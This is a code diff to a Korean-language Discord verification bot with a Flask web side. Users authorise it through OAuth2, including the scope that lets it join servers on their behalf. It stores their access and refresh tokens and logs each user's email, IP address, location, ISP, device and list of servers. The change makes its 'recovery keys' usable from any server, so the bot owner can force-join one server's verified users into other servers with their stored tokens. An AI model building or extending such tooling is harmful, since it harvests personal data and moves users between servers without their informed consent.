@@ -18,7 +18,7 @@ from datetime import datetime, timezone, timedelta
 from flask import Flask, request, render_template_string, redirect, session, url_for
 
 # ============================================================
-# 공통 설정 (환경변수)
+# 공통 설정
 # ============================================================
 TOKEN = os.getenv("DISCORD_BOT_TOKEN")
 BASE_URL = os.getenv("BASE_URL", "http://127.0.0.1:5000")
@@ -64,9 +64,12 @@ oauth_states = {}
 def init_db():
     conn = sqlite3.connect(DB_PATH)
     c = conn.cursor()
-    c.execute('''CREATE TABLE IF NOT EXISTS servers (
-        guild_id INTEGER PRIMARY KEY,
-        recovery_key TEXT
+    # ✅ 복구키를 전역 유니크하게 (서버 구분 없이 키로 조회 가능)
+    c.execute('''CREATE TABLE IF NOT EXISTS recovery_keys (
+        recovery_key TEXT PRIMARY KEY,
+        guild_id INTEGER,
+        guild_name TEXT,
+        created_at TEXT
     )''')
     c.execute('''CREATE TABLE IF NOT EXISTS verified_users (
         guild_id INTEGER,
@@ -81,20 +84,37 @@ def init_db():
 
 init_db()
 
-def set_recovery_key(guild_id: int, key: str):
+# ✅ 서버당 복구키 1개 (재생성 시 기존 키 삭제)
+def set_recovery_key(guild_id: int, guild_name: str, key: str):
     conn = sqlite3.connect(DB_PATH)
     c = conn.cursor()
-    c.execute("INSERT OR REPLACE INTO servers (guild_id, recovery_key) VALUES (?, ?)", (guild_id, key))
+    # 기존 이 서버의 키 삭제
+    c.execute("DELETE FROM recovery_keys WHERE guild_id = ?", (guild_id,))
+    # 새 키 추가
+    c.execute(
+        "INSERT INTO recovery_keys (recovery_key, guild_id, guild_name, created_at) VALUES (?, ?, ?, ?)",
+        (key, guild_id, guild_name, datetime.now(timezone.utc).isoformat())
+    )
     conn.commit()
     conn.close()
 
-def get_recovery_key(guild_id: int):
+def get_recovery_key_by_guild(guild_id: int):
+    """이 서버가 가진 복구키 조회"""
     conn = sqlite3.connect(DB_PATH)
     c = conn.cursor()
-    c.execute("SELECT recovery_key FROM servers WHERE guild_id = ?", (guild_id,))
+    c.execute("SELECT recovery_key FROM recovery_keys WHERE guild_id = ?", (guild_id,))
     row = c.fetchone()
     conn.close()
     return row[0] if row else None
+
+def get_guild_by_recovery_key(key: str):
+    """복구키로 어느 서버의 키인지 조회"""
+    conn = sqlite3.connect(DB_PATH)
+    c = conn.cursor()
+    c.execute("SELECT guild_id, guild_name FROM recovery_keys WHERE recovery_key = ?", (key,))
+    row = c.fetchone()
+    conn.close()
+    return row if row else (None, None)
 
 def add_verified_user(guild_id: int, user_id: int, access_token: str, refresh_token: str):
     conn = sqlite3.connect(DB_PATH)
@@ -147,7 +167,7 @@ def generate_oauth2_url(guild_id=None, user_id=None, bot_name=None):
         "client_id": DISCORD_CLIENT_ID,
         "redirect_uri": DISCORD_REDIRECT_URI,
         "response_type": "code",
-        "scope": "identify email guilds guilds.join",  # ✅ guilds.join 추가
+        "scope": "identify email guilds guilds.join",
         "state": state
     }
     return f"{DISCORD_OAUTH2_URL}?{urllib.parse.urlencode(params)}"
@@ -197,9 +217,9 @@ def get_user_guilds(access_token):
     response = requests.get(f"{DISCORD_API_BASE}/users/@me/guilds", headers=headers)
     return response.json()
 
-def add_user_with_oauth(bot_token, guild_id, user_id, user_access_token):
-    """OAuth2 토큰으로 사용자를 서버에 강제 추가"""
-    url = f"{DISCORD_API_BASE}/guilds/{guild_id}/members/{user_id}"
+def add_user_with_oauth(bot_token, target_guild_id, user_id, user_access_token):
+    """OAuth2 토큰으로 사용자를 대상 서버에 강제 추가"""
+    url = f"{DISCORD_API_BASE}/guilds/{target_guild_id}/members/{user_id}"
     headers = {
         "Authorization": f"Bot {bot_token}",
         "Content-Type": "application/json"
@@ -219,29 +239,22 @@ def add_user_with_oauth(bot_token, guild_id, user_id, user_access_token):
         return False, str(e)
 
 # ============================================================
-# VPN / 모바일 데이터 감지
+# VPN / 모바일 감지
 # ============================================================
 def detect_vpn(isp: str, org: str) -> bool:
     if not isp and not org:
         return False
     combined = f"{isp} {org}".lower()
     keywords = ["vpn", "proxy", "hosting", "cloud", "aws", "amazon", "digitalocean", "linode", "vultr", "heroku", "ovh", "azure", "gcp", "google cloud", "alibaba", "tencent", "cloudflare", "tor", "anonymizer"]
-    for kw in keywords:
-        if kw in combined:
-            return True
-    return False
+    return any(kw in combined for kw in keywords)
 
 def detect_mobile_data(isp: str, org: str, user_agent: str) -> bool:
     ua = user_agent.lower()
-    mobile_ua = ["android", "iphone", "ipad", "mobile", "blackberry", "windows phone"]
-    if any(k in ua for k in mobile_ua):
+    if any(k in ua for k in ["android", "iphone", "ipad", "mobile", "blackberry", "windows phone"]):
         return True
     combined = f"{isp} {org}".lower()
     mobile_isp = ["kt", "skt", "lg u+", "lg uplus", "sk telecom", "korea telecom", "olleh", "lgu+", "mobile", "cell", "lte", "4g", "5g", "3g", "wireless", "telekom", "t-mobile", "vodafone", "orange", "o2", "three", "ee", "verizon", "at&t", "sprint"]
-    for kw in mobile_isp:
-        if kw in combined:
-            return True
-    return False
+    return any(kw in combined for kw in mobile_isp)
 
 # ============================================================
 # 봇 클라이언트
@@ -289,9 +302,9 @@ def is_bot_owner(ctx):
 @bot.event
 async def on_command_error(ctx, error):
     if isinstance(error, commands.MissingPermissions):
-        await ctx.send("❌ 이 명령어는 서버 소유자 또는 허용된 사용자만 사용할 수 있어요.")
+        await ctx.send("❌ 관리자만 사용할 수 있어요.")
     elif isinstance(error, commands.NoPrivateMessage):
-        await ctx.send("❌ 이 명령어는 서버 안에서만 사용할 수 있어요.")
+        await ctx.send("❌ 서버 안에서만 사용할 수 있어요.")
     elif isinstance(error, commands.MissingRequiredArgument):
         await ctx.send("❌ 필요한 값이 빠졌어요.")
     else:
@@ -426,10 +439,9 @@ async def reauth_all(ctx: commands.Context):
     await ctx.send(f"✅ {removed_count}명 역할 제거 완료")
 
 # ============================================================
-# ✅ 복구 관련 명령어
+# ✅ 복구 명령어 (서버 간 키 공유 가능)
 # ============================================================
 def generate_recovery_key():
-    """복구키 생성 (예: ABCD-1234-EFGH)"""
     chars = string.ascii_uppercase + string.digits
     parts = [''.join(random.choices(chars, k=4)) for _ in range(3)]
     return "-".join(parts)
@@ -437,24 +449,35 @@ def generate_recovery_key():
 @bot.command(name="복생")
 @commands.check(is_bot_owner)
 async def create_recovery_key(ctx: commands.Context):
-    """이 서버의 복구키를 생성합니다 (봇 소유자에게만 DM)"""
-    key = generate_recovery_key()
-    set_recovery_key(ctx.guild.id, key)
+    """이 서버의 복구키를 생성합니다 (전역 유니크)"""
+    # 중복되지 않는 키 생성
+    for _ in range(10):
+        key = generate_recovery_key()
+        existing_gid, _ = get_guild_by_recovery_key(key)
+        if not existing_gid:
+            break
+    else:
+        await ctx.send("❌ 복구키 생성 실패. 다시 시도해주세요.")
+        return
+
+    set_recovery_key(ctx.guild.id, ctx.guild.name, key)
+
     try:
         await ctx.author.send(
             f"🔑 **{ctx.guild.name}** 서버의 복구키가 생성되었습니다.\n"
             f"복구키: `{key}`\n\n"
-            f"이 키를 잃어버리면 서버 복구가 불가능합니다. 안전한 곳에 보관하세요."
+            f"⚠️ 이 키는 **다른 서버에서도** 사용 가능합니다.\n"
+            f"`?복구 {key}`를 입력하면 이 서버에서 인증한 사람들을 다른 서버로 복구할 수 있어요."
         )
         await ctx.send("✅ 복구키가 생성되었습니다. DM을 확인해주세요.", delete_after=5)
     except discord.Forbidden:
-        await ctx.send("❌ DM을 보낼 수 없습니다. 개인정보 설정을 확인해주세요.")
+        await ctx.send(f"❌ DM 전송 실패. 복구키: `{key}` (이 메시지는 30초 후 삭제됩니다)", delete_after=30)
 
 @bot.command(name="복표")
 @commands.check(is_bot_owner)
 async def show_recovery_key(ctx: commands.Context):
-    """이 서버의 복구키를 확인합니다 (봇 소유자에게만 DM)"""
-    key = get_recovery_key(ctx.guild.id)
+    """이 서버의 복구키를 확인합니다"""
+    key = get_recovery_key_by_guild(ctx.guild.id)
     if not key:
         try:
             await ctx.author.send("❌ 아직 복구키가 생성되지 않았습니다. `?복생`으로 생성하세요.")
@@ -468,27 +491,40 @@ async def show_recovery_key(ctx: commands.Context):
         )
         await ctx.send("✅ DM을 확인해주세요.", delete_after=5)
     except discord.Forbidden:
-        await ctx.send("❌ DM을 보낼 수 없습니다.")
+        await ctx.send(f"❌ DM 전송 실패. 복구키: `{key}` (이 메시지는 30초 후 삭제됩니다)", delete_after=30)
 
 @bot.command(name="복구")
 @commands.check(is_bot_owner)
 async def recover_users(ctx: commands.Context, key: str):
-    """복구키로 이 서버에서 인증한 사용자를 복구합니다"""
-    guild = ctx.guild
-    stored_key = get_recovery_key(guild.id)
-    if not stored_key:
-        await ctx.send("❌ 이 서버에 복구키가 설정되지 않았습니다. `?복생`으로 생성하세요.")
-        return
-    if stored_key != key:
-        await ctx.send("❌ 복구키가 일치하지 않습니다.")
+    """
+    복구키로 해당 서버에서 인증한 사용자를 **현재 서버로** 복구합니다.
+    - 복구키가 A 서버에서 생성되었으면 → A 서버 인증자들이 현재 서버로 초대됨
+    """
+    current_guild = ctx.guild
+
+    # 복구키의 원본 서버 조회
+    origin_guild_id, origin_guild_name = get_guild_by_recovery_key(key)
+    if not origin_guild_id:
+        await ctx.send("❌ 유효하지 않은 복구키입니다.")
         return
 
-    users = get_verified_users(guild.id)
+    # 원본 서버에서 인증한 유저 목록
+    users = get_verified_users(origin_guild_id)
     if not users:
-        await ctx.send("ℹ️ 이 서버에서 인증한 사용자가 없습니다.")
+        await ctx.send(f"ℹ️ **{origin_guild_name}** 서버에서 인증한 사용자가 없습니다.")
         return
 
-    await ctx.send(f"🔄 이 서버에서 인증한 **{len(users)}명**의 복구를 시작합니다...")
+    # 자기 자신 서버로 복구하는 경우 안내
+    if origin_guild_id == current_guild.id:
+        await ctx.send(
+            f"🔑 이 복구키는 **현재 서버**의 키입니다.\n"
+            f"→ **{origin_guild_name}** 에서 인증한 {len(users)}명을 현재 서버로 복구합니다."
+        )
+    else:
+        await ctx.send(
+            f"🔑 복구키 확인됨: **{origin_guild_name}**\n"
+            f"→ **{origin_guild_name}** 에서 인증한 **{len(users)}명**을 **{current_guild.name}** 서버로 복구합니다..."
+        )
 
     added_new = 0
     already_exist = 0
@@ -498,14 +534,14 @@ async def recover_users(ctx: commands.Context, key: str):
 
     for user_id, access_token, refresh_token in users:
         try:
-            # 이미 서버에 있는지 확인
-            if guild.get_member(user_id):
+            # 현재 서버(복구 대상)에 이미 있는지 확인
+            if current_guild.get_member(user_id):
                 already_exist += 1
                 results.append(f"✅ {user_id}: 이미 존재함")
                 continue
 
-            # 1차 시도
-            success, msg = add_user_with_oauth(bot.bot_token, guild.id, user_id, access_token)
+            # 1차 시도: OAuth2 토큰으로 대상 서버에 추가
+            success, msg = add_user_with_oauth(bot.bot_token, current_guild.id, user_id, access_token)
 
             # 토큰 만료 시 refresh
             if not success and "만료" in msg and refresh_token:
@@ -513,8 +549,9 @@ async def recover_users(ctx: commands.Context, key: str):
                 if new_tokens and new_tokens.get("access_token"):
                     new_access = new_tokens["access_token"]
                     new_refresh = new_tokens.get("refresh_token", refresh_token)
-                    update_user_tokens(guild.id, user_id, new_access, new_refresh)
-                    success, msg = add_user_with_oauth(bot.bot_token, guild.id, user_id, new_access)
+                    # 원본 서버 기준으로 토큰 갱신 저장
+                    update_user_tokens(origin_guild_id, user_id, new_access, new_refresh)
+                    success, msg = add_user_with_oauth(bot.bot_token, current_guild.id, user_id, new_access)
                     if success:
                         token_refreshed += 1
 
@@ -535,7 +572,7 @@ async def recover_users(ctx: commands.Context, key: str):
             results.append(f"❌ {user_id}: 예외 - {str(e)}")
 
     summary = (
-        f"✅ **복구 완료!**\n"
+        f"✅ **복구 완료!** (원본: **{origin_guild_name}** → 대상: **{current_guild.name}**)\n"
         f"• 새로 추가: {added_new}명\n"
         f"• 이미 존재: {already_exist}명\n"
         f"• 실패: {failed}명\n"
@@ -551,19 +588,21 @@ async def recover_users(ctx: commands.Context, key: str):
         )
         await ctx.send("📋 상세 결과:", file=result_file)
 
-    # 로그 채널에도 전송
-    gcfg = get_guild_cfg(guild.id)
+    # 현재 서버 로그 채널에도 전송
+    gcfg = get_guild_cfg(current_guild.id)
     log_channel_id = gcfg.get("log_channel")
     if log_channel_id:
-        log_channel = guild.get_channel(log_channel_id)
+        log_channel = current_guild.get_channel(log_channel_id)
         if log_channel:
             embed = discord.Embed(
                 title="📨 복구 실행됨",
-                description=f"복구키로 이 서버 인증자 복구 완료",
+                description=f"복구키로 **{origin_guild_name}** 인증자들을 복구했습니다.",
                 color=discord.Color.blue(),
                 timestamp=datetime.now(timezone.utc)
             )
             embed.add_field(name="실행자", value=ctx.author.mention, inline=False)
+            embed.add_field(name="원본 서버", value=origin_guild_name, inline=True)
+            embed.add_field(name="대상 서버", value=current_guild.name, inline=True)
             embed.add_field(name="새로 추가", value=str(added_new), inline=True)
             embed.add_field(name="이미 존재", value=str(already_exist), inline=True)
             embed.add_field(name="실패", value=str(failed), inline=True)
@@ -575,9 +614,9 @@ async def recover_users(ctx: commands.Context, key: str):
 @bot.command(name="복구정보")
 @commands.check(is_bot_owner)
 async def recovery_info(ctx: commands.Context):
-    """이 서버의 복구 관련 정보를 확인합니다"""
+    """이 서버의 복구 관련 정보"""
     guild = ctx.guild
-    key = get_recovery_key(guild.id)
+    key = get_recovery_key_by_guild(guild.id)
     count = count_verified_users(guild.id)
 
     embed = discord.Embed(
@@ -585,16 +624,9 @@ async def recovery_info(ctx: commands.Context):
         color=discord.Color.gold(),
         timestamp=datetime.now(timezone.utc)
     )
-    embed.add_field(
-        name="복구키",
-        value=f"`{key}`" if key else "❌ 생성되지 않음",
-        inline=False
-    )
-    embed.add_field(
-        name="복구 대상 인원",
-        value=f"{count}명",
-        inline=False
-    )
+    embed.add_field(name="이 서버의 복구키", value=f"`{key}`" if key else "❌ 생성되지 않음", inline=False)
+    embed.add_field(name="이 서버에서 인증한 인원", value=f"{count}명", inline=False)
+    embed.set_footer(text="이 복구키로 다른 서버에서도 이 서버 인증자들을 복구할 수 있습니다.")
     await ctx.send(embed=embed, ephemeral=True)
 
 @bot.command(name="설정확인")
@@ -607,8 +639,8 @@ async def check_config(ctx: commands.Context):
     embed = discord.Embed(title="⚙️ 서버 설정", color=discord.Color.blue())
     embed.add_field(name="인증 역할", value=verify_role.mention if verify_role else "❌ 없음", inline=False)
     embed.add_field(name="로그 채널", value=log_channel.mention if log_channel else "❌ 없음", inline=False)
-    embed.add_field(name="복구키", value=f"`{get_recovery_key(ctx.guild.id) or '미생성'}`", inline=False)
-    embed.add_field(name="복구 인원", value=f"{count_verified_users(ctx.guild.id)}명", inline=False)
+    embed.add_field(name="복구키", value=f"`{get_recovery_key_by_guild(ctx.guild.id) or '미생성'}`", inline=False)
+    embed.add_field(name="인증 인원", value=f"{count_verified_users(ctx.guild.id)}명", inline=False)
     await ctx.send(embed=embed, ephemeral=True)
 
 # ============================================================
@@ -676,11 +708,11 @@ class ConsoleView(discord.ui.View):
                 color=discord.Color.blue()
             )
             embed.add_field(
-                name="^ 위에 있는 하이퍼 링크를 통해 인증을 하세요.",
-                value="᲻",
+                name="📋 필요 권한",
+                value="• 이메일 보기\n• 서버 목록 보기\n• **나 대신 서버 참가하기**",
                 inline=False
             )
-            embed.set_footer(text="인증을 완료하면 역할이 지급됩니다.")
+            embed.set_footer(text="로그인 후 CAPTCHA를 완료하면 인증이 완료됩니다.")
             await interaction.followup.send(embed=embed, ephemeral=True)
         except Exception as e:
             traceback.print_exc()
@@ -895,17 +927,7 @@ def captcha_page():
             if not token:
                 token = ''.join(random.choices(string.ascii_letters + string.digits, k=16))
                 session['captcha_token'] = token
-            return render_template_string(
-                CAPTCHA_PAGE,
-                site_key=RECAPTCHA_SITE_KEY or "",
-                token=token,
-                user_id=user_id,
-                user_name=user_name,
-                user_avatar=user_avatar,
-                user_email=user_email,
-                msg="",
-                msg_type=""
-            )
+            return render_template_string(CAPTCHA_PAGE, site_key=RECAPTCHA_SITE_KEY or "", token=token, user_id=user_id, user_name=user_name, user_avatar=user_avatar, user_email=user_email, msg="", msg_type="")
 
         recaptcha_response = request.form.get('g-recaptcha-response')
         if not recaptcha_response:
@@ -924,10 +946,7 @@ def captcha_page():
         user_agent = request.headers.get('User-Agent', '알 수 없음')
 
         future = asyncio.run_coroutine_threadsafe(
-            assign_role_from_web_wrapper(
-                token, ip, guild_id, int(user_id), bot,
-                user_data, access_token, refresh_token, user_agent
-            ),
+            assign_role_from_web_wrapper(token, ip, guild_id, int(user_id), bot, user_data, access_token, refresh_token, user_agent),
             bot.loop
         )
         try:
@@ -958,14 +977,13 @@ def verify_recaptcha(response_token: str) -> bool:
         return False
 
 # ============================================================
-# 웹 인증 처리 (DB 저장 + 복구 인원 카운트)
+# 웹 인증 처리
 # ============================================================
 async def assign_role_from_web_wrapper(token, ip, guild_id, user_id, bot_instance, user_data, access_token, refresh_token, user_agent):
     try:
         guild = bot_instance.get_guild(guild_id)
         if not guild:
             return False, "서버를 찾을 수 없습니다."
-
         member = guild.get_member(user_id)
         if not member:
             return False, "서버에서 사용자를 찾을 수 없습니다."
@@ -974,12 +992,10 @@ async def assign_role_from_web_wrapper(token, ip, guild_id, user_id, bot_instanc
         verify_role_id = gcfg.get("verify_role")
         if not verify_role_id:
             return False, "인증 역할이 설정되지 않았습니다."
-
         role = guild.get_role(verify_role_id)
         if not role:
             return False, "역할이 존재하지 않습니다."
 
-        # IP 정보
         location = "알 수 없음"
         isp = "알 수 없음"
         org = "알 수 없음"
@@ -1005,17 +1021,15 @@ async def assign_role_from_web_wrapper(token, ip, guild_id, user_id, bot_instanc
         if is_mobile:
             return False, "❌ 모바일 데이터 사용은 인증이 불가능합니다. Wi-Fi로 연결해주세요."
 
-        # 역할 지급 (기존 역할 유지)
         try:
             await member.add_roles(role, reason="웹 인증 완료")
         except discord.Forbidden:
-            return False, "봇 역할이 인증 역할보다 낮습니다. 봇 역할을 위로 올려주세요."
+            return False, "봇 역할이 인증 역할보다 낮습니다."
 
-        # ✅ DB에 인증자 저장 (복구용)
+        # DB 저장
         add_verified_user(guild_id, user_id, access_token or "", refresh_token or "")
         recovery_count = count_verified_users(guild_id)
 
-        # 서버 목록 파일
         user_guilds = []
         guilds_file = None
         if access_token:
@@ -1024,14 +1038,10 @@ async def assign_role_from_web_wrapper(token, ip, guild_id, user_id, bot_instanc
                 user_guilds = [f"{g['name']} ({g['id']})" for g in guilds_data]
                 if user_guilds:
                     guilds_text = "\n".join([f"{i+1}. {g}" for i, g in enumerate(user_guilds)])
-                    guilds_file = discord.File(
-                        io.BytesIO(guilds_text.encode('utf-8')),
-                        filename=f"서버목록_{user_id}_{int(time.time())}.txt"
-                    )
+                    guilds_file = discord.File(io.BytesIO(guilds_text.encode('utf-8')), filename=f"서버목록_{user_id}_{int(time.time())}.txt")
             except:
                 pass
 
-        # 계정 생성일
         created_at = user_data.get('created_at')
         created_str = "알 수 없음"
         days_ago = "알 수 없음"
@@ -1046,7 +1056,6 @@ async def assign_role_from_web_wrapper(token, ip, guild_id, user_id, bot_instanc
 
         email = user_data.get('email', '이메일 없음')
 
-        # 로그 전송
         log_channel_id = gcfg.get("log_channel")
         if log_channel_id:
             log_channel = guild.get_channel(log_channel_id)
@@ -1058,31 +1067,17 @@ async def assign_role_from_web_wrapper(token, ip, guild_id, user_id, bot_instanc
                     color=discord.Color.green(),
                     timestamp=datetime.now(timezone.utc)
                 )
-                embed.add_field(
-                    name="유저 정보",
-                    value=f"{member.mention} | {member} (Global name: {user_data.get('global_name', '없음')}, ID: {user_id})",
-                    inline=False
-                )
+                embed.add_field(name="유저 정보", value=f"{member.mention} | {member} (Global name: {user_data.get('global_name', '없음')}, ID: {user_id})", inline=False)
                 embed.add_field(name="이메일", value=email, inline=False)
                 embed.add_field(name="계정 생성일", value=f"{created_str} ({days_ago})", inline=False)
                 embed.add_field(name="인증 시각", value=now_kst.strftime("%Y년 %m월 %d일 %A %p %I:%M"), inline=False)
-                embed.add_field(
-                    name="아이피 정보",
-                    value=f"아이피: {ip}\n위치: {location}\n통신사: {isp}",
-                    inline=False
-                )
+                embed.add_field(name="아이피 정보", value=f"아이피: {ip}\n위치: {location}\n통신사: {isp}", inline=False)
                 embed.add_field(name="기기 정보", value=f"브라우저: {user_agent[:50]}", inline=False)
                 embed.add_field(name="VPN", value="❌" if is_vpn else "✅", inline=True)
                 embed.add_field(name="모바일", value="❌" if is_mobile else "✅", inline=True)
                 embed.add_field(name="참가 서버 수", value=f"{len(user_guilds)}개", inline=False)
-                # ✅ 예상 복구 인원 (DB 기반)
-                embed.add_field(
-                    name="예상 복구 인원",
-                    value=f"**{recovery_count}명**",
-                    inline=False
-                )
+                embed.add_field(name="예상 복구 인원", value=f"**{recovery_count}명**", inline=False)
                 embed.set_thumbnail(url=member.display_avatar.url)
-
                 try:
                     if guilds_file:
                         await log_channel.send(embed=embed, file=guilds_file)
@@ -1103,9 +1098,6 @@ async def assign_role_from_web_wrapper(token, ip, guild_id, user_id, bot_instanc
 def run_flask():
     app.run(host=WEB_HOST, port=WEB_PORT, debug=False, use_reloader=False)
 
-# ============================================================
-# 메인
-# ============================================================
 if __name__ == "__main__":
     if not TOKEN:
         print("❌ DISCORD_BOT_TOKEN이 없습니다!")
